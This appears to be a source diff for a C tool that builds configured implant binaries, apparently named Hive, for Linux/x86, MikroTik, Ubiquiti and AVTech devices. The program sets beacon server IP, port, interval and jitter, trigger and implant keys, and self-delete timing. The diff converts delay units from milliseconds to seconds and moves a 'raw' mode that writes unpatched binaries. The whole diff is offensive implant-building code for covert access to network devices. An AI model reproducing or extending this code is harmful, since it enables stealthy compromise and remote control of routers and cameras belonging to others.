@@ -51,10 +51,10 @@
 //********************************************************************************
 
 #define SIG_HEAD    				0x7AD8CFB6
-#define DEFAULT_INITIAL_DELAY		3 * 60 * 1000		// 3 minutes
+#define DEFAULT_INITIAL_DELAY		3 * 60				// 3 minutes
 #define DEFAULT_BEACON_PORT			443					// TCP port 443 (HTTPS)
 #define DEFAULT_BEACON_INTERVAL		0					// operators did not want a default value
-#define DEFAULT_TRIGGER_DELAY		60 * 1000			// 60 seconds
+#define DEFAULT_TRIGGER_DELAY		60					// 60 seconds
 #define DEFAULT_BEACON_JITTER		3					// Default value is 3, range is from 0<=jitter<=30
 #define DEFAULT_SELF_DELETE_DELAY	60 * 24 * 60 * 60	// Default value is 60 days...
 
@@ -194,7 +194,7 @@ int main(int argc, char **argv)
 			break;
 
 		case 'd':	// initial delay
-			args.init_delay = strtoul(optarg, NULL, 10) * 1000;
+			args.init_delay = strtoul(optarg, NULL, 10);
 			break;
 
 		case 'h':	// Help
@@ -202,7 +202,7 @@ int main(int argc, char **argv)
 			break;
 
 		case 'i':	// beacon interval
-			args.interval = (unsigned int) atoi(optarg) * 1000;
+			args.interval = (unsigned int) atoi(optarg);
 			break;
 
 		case 'j':	// beacon jitter
@@ -380,7 +380,7 @@ int main(int argc, char **argv)
 			break;
 
 		case 't':	// trigger delay
-			args.trigger_delay = (unsigned int) atoi(optarg) * 1000;
+			args.trigger_delay = (unsigned int) atoi(optarg);
 			break;
 
 		default:
@@ -388,6 +388,26 @@ int main(int argc, char **argv)
 			return -1;
 			break;
 		}
+	}
+
+	if (raw == 1) {
+		printf("Creating raw unpatched binaries for all supported architectures...");
+
+		remove(HIVE_LINUX_X86_UNPATCHED);
+		remove(HIVE_MIKROTIK_X86_UNPATCHED);
+		remove(HIVE_MIKROTIK_MIPS_UNPATCHED);
+		remove(HIVE_MIKROTIK_PPC_UNPATCHED);
+		remove(HIVE_UBIQUITI_MIPS_UNPATCHED);
+		remove(HIVE_AVTECH_ARM_UNPATCHED);
+
+		non_patch(HIVE_LINUX_X86_UNPATCHED, hived_linux_x86_unpatched, hived_linux_x86_unpatched_len);
+		non_patch(HIVE_MIKROTIK_X86_UNPATCHED, hived_mikrotik_x86_unpatched, hived_mikrotik_x86_unpatched_len);
+		non_patch(HIVE_MIKROTIK_MIPS_UNPATCHED, hived_mikrotik_mips_unpatched, hived_mikrotik_mips_unpatched_len);
+		non_patch(HIVE_MIKROTIK_PPC_UNPATCHED, hived_mikrotik_ppc_unpatched, hived_mikrotik_ppc_unpatched_len);
+		non_patch(HIVE_UBIQUITI_MIPS_UNPATCHED, hived_ubiquiti_mips_unpatched, hived_ubiquiti_mips_unpatched_len);
+		non_patch(HIVE_AVTECH_ARM_UNPATCHED, hived_avtech_arm_unpatched, hived_avtech_arm_unpatched_len);
+		printf("done.\n");
+		return 0;
 	}
 
 	if (! keyed) {		// Verify that a key was supplied
@@ -424,74 +444,72 @@ int main(int argc, char **argv)
 		}
 	}
 
-	if (raw == 0) {
-		if (args.init_delay > 0) {			// Beacons enabled
-			if ((args.beacon_port == 0) || (args.interval == 0) || (strlen(args.beacon_ip) == 0)) {
-				printf("\n");
-				printf("    %sERROR: Incomplete options%s\n", RED, RESET);
-				usage(argv);
-				return -1;
-			}
-			// Enforce 0 <= jitter <= 30 requirement.
-			if (((int) args.jitter < 0) || (args.jitter > 30)) {
-				printf("\n");
-				printf("    %sError: Incorrect options%s\n", RED, RESET);
-				usage(argv);
-				return -1;
-			}
-		}
 
-		if (	(linux_x86 == 0) &&
-				(mikrotik_x86 == 0) &&
-				(mikrotik_mips == 0) && (mikrotik_ppc == 0) &&
-				(ubiquiti_mips == 0) &&
-				(avtech_arm == 0)
-				) {	// no OS was selected, so default is to build all
-					linux_x86 = 1;
-					mikrotik_x86 = 1;
-					mikrotik_mips = 1;
-					mikrotik_ppc = 1;
-					ubiquiti_mips = 1;
-					avtech_arm = 1;
+	if (args.init_delay > 0) {			// Beacons enabled
+		if ((args.beacon_port == 0) || (args.interval == 0) || (strlen(args.beacon_ip) == 0)) {
+			printf("\n");
+			printf("    %sERROR: Incomplete options%s\n", RED, RESET);
+			usage(argv);
+			return -1;
 		}
-
-		printf("\n");
-		printf("  This application will generate PATCHED files with the following values:\n\n");
-		printf("\t%32s: %-s\n", "Primary DNS Server IP address", args.dns[0]);
-		printf("\t%32s: %-s\n", "Secondary DNS Server IP address", args.dns[1]);
-		printf("\t%32s: ", "Trigger Key"); printSha1Hash(stdout, "", triggerKey); printf("\n");
-		printf("\t%32s: ", "Implant Key"); printSha1Hash(stdout, "", implantKey); printf("\n");
-		if (args.init_delay > 0) {
-			printf("\n\t%32s: %-s\n", "Beacon Server IP address", host);
-			printf("\t%32s: %-d\n", "Beacon Server Port number", args.beacon_port);
-			printf("\t%32s: %-lu\n", "Beacon Initial Delay (sec)", args.init_delay / 1000);
-			printf("\t%32s: %-d\n", "Beacon Interval (sec)", args.interval / 1000);
-			printf("\t%32s: %-d\n", "Beacon Jitter (%)", args.jitter);
-		} else {
-			printf("\n\t%32s\n", "Beacons Disabled");
+		// Enforce 0 <= jitter <= 30 requirement.
+		if (((int) args.jitter < 0) || (args.jitter > 30)) {
+			printf("\n");
+			printf("    %sError: Incorrect options%s\n", RED, RESET);
+			usage(argv);
+			return -1;
 		}
-		printf("\n\t%32s: %-lu\n", "Self Delete Delay (sec)", args.delete_delay);
-		printf("\t%32s: %-s\n", "Self Delete Control File Path", args.sdpath);
-		printf("\t%32s: %-d\n", "Trigger Delay (+/-30 sec)", args.trigger_delay / 1000);
 	}
+
+	if (	(linux_x86 == 0) &&
+			(mikrotik_x86 == 0) &&
+			(mikrotik_mips == 0) && (mikrotik_ppc == 0) &&
+			(ubiquiti_mips == 0) &&
+			(avtech_arm == 0)
+			) {	// no OS was selected, so default is to build all
+				linux_x86 = 1;
+				mikrotik_x86 = 1;
+				mikrotik_mips = 1;
+				mikrotik_ppc = 1;
+				ubiquiti_mips = 1;
+				avtech_arm = 1;
+	}
+
+	printf("\n");
+	printf("  This application will generate PATCHED files with the following values:\n\n");
+	printf("\t%32s: %-s\n", "Primary DNS Server IP address", args.dns[0]);
+	printf("\t%32s: %-s\n", "Secondary DNS Server IP address", args.dns[1]);
+	printf("\t%32s: ", "Trigger Key"); printSha1Hash(stdout, "", triggerKey); printf("\n");
+	printf("\t%32s: ", "Implant Key"); printSha1Hash(stdout, "", implantKey); printf("\n");
+	if (args.init_delay > 0) {
+		printf("\n\t%32s: %-s\n", "Beacon Server IP address", host);
+		printf("\t%32s: %-d\n", "Beacon Server Port number", args.beacon_port);
+		printf("\t%32s: %-lu\n", "Beacon Initial Delay (sec)", args.init_delay);
+		printf("\t%32s: %-d\n", "Beacon Interval (sec)", args.interval);
+		printf("\t%32s: %-d\n", "Beacon Jitter (%)", args.jitter);
+	} else {
+		printf("\n\t%32s\n", "Beacons Disabled");
+	}
+	printf("\n\t%32s: %-lu\n", "Self Delete Delay (sec)", args.delete_delay);
+	printf("\t%32s: %-s\n", "Self Delete Control File Path", args.sdpath);
+	printf("\t%32s: %-d\n", "Trigger Delay (+/-30 sec)", args.trigger_delay);
+
 
 	printf("\n  Target Operating Systems:\n");
 
 	// little endian systems targets
 
-	if (linux_x86 == 1 || raw == 1)		printf("   . Linux/x86\n");
-	if (mikrotik_x86 == 1 || raw == 1)	printf("   . MikroTik/x86\n");
-	if (mikrotik_mips == 1 || raw == 1)	printf("   . MikroTik/MIPS\n");
-	if (mikrotik_ppc == 1 || raw == 1)	printf("   . MikroTik/PPC\n");
-	if (ubiquiti_mips == 1 || raw == 1)	printf("   . Ubiquiti/MIPS\n");
-	if (avtech_arm == 1 || raw == 1)	printf("   . AVTech/ARM\n");
+	if (linux_x86 == 1)		printf("   . Linux/x86\n");
+	if (mikrotik_x86 == 1)	printf("   . MikroTik/x86\n");
+	if (mikrotik_mips == 1)	printf("   . MikroTik/MIPS\n");
+	if (mikrotik_ppc == 1)	printf("   . MikroTik/PPC\n");
+	if (ubiquiti_mips == 1)	printf("   . Ubiquiti/MIPS\n");
+	if (avtech_arm == 1)	printf("   . AVTech/ARM\n");
 
-	if (raw == 0) {
-		cl_string((unsigned char *) args.dns[0], sizeof(args.dns[0]));
-		cl_string((unsigned char *) args.dns[1], sizeof(args.dns[1]));
-		cl_string((unsigned char *) args.beacon_ip, sizeof(args.beacon_ip));
-		cl_string((unsigned char *) args.sdpath, sizeof(args.sdpath));
-	}
+	cl_string((unsigned char *) args.dns[0], sizeof(args.dns[0]));
+	cl_string((unsigned char *) args.dns[1], sizeof(args.dns[1]));
+	cl_string((unsigned char *) args.beacon_ip, sizeof(args.beacon_ip));
+	cl_string((unsigned char *) args.sdpath, sizeof(args.sdpath));
 
 	remove(HIVE_LINUX_X86_FILE);
 	remove(HIVE_MIKROTIK_X86_FILE);
@@ -500,24 +518,9 @@ int main(int argc, char **argv)
 	remove(HIVE_UBIQUITI_MIPS_FILE);
 	remove(HIVE_AVTECH_ARM_FILE);
 
-	remove(HIVE_LINUX_X86_UNPATCHED);
-	remove(HIVE_MIKROTIK_X86_UNPATCHED);
-	remove(HIVE_MIKROTIK_MIPS_UNPATCHED);
-	remove(HIVE_MIKROTIK_PPC_UNPATCHED);
-	remove(HIVE_UBIQUITI_MIPS_UNPATCHED);
-	remove(HIVE_AVTECH_ARM_UNPATCHED);
 
 	sleep(1);
 
-	if (raw == 1) {
-		printf("\n");
-		non_patch(HIVE_LINUX_X86_UNPATCHED, hived_linux_x86_unpatched, hived_linux_x86_unpatched_len);
-		non_patch(HIVE_MIKROTIK_X86_UNPATCHED, hived_mikrotik_x86_unpatched, hived_mikrotik_x86_unpatched_len);
-		non_patch(HIVE_MIKROTIK_MIPS_UNPATCHED, hived_mikrotik_mips_unpatched, hived_mikrotik_mips_unpatched_len);
-		non_patch(HIVE_MIKROTIK_PPC_UNPATCHED, hived_mikrotik_ppc_unpatched, hived_mikrotik_ppc_unpatched_len);
-		non_patch(HIVE_UBIQUITI_MIPS_UNPATCHED, hived_ubiquiti_mips_unpatched, hived_ubiquiti_mips_unpatched_len);
-		non_patch(HIVE_AVTECH_ARM_UNPATCHED, hived_avtech_arm_unpatched, hived_avtech_arm_unpatched_len);
-	}
 // We start as Little Endian.  If the binary is detected as Big Endian, then the structure
 // is changed to Big Endian.  Since these changes are made in a global variable used by all
 // parsers, check for Little Endian variants first and the Big Endian possibilities next.
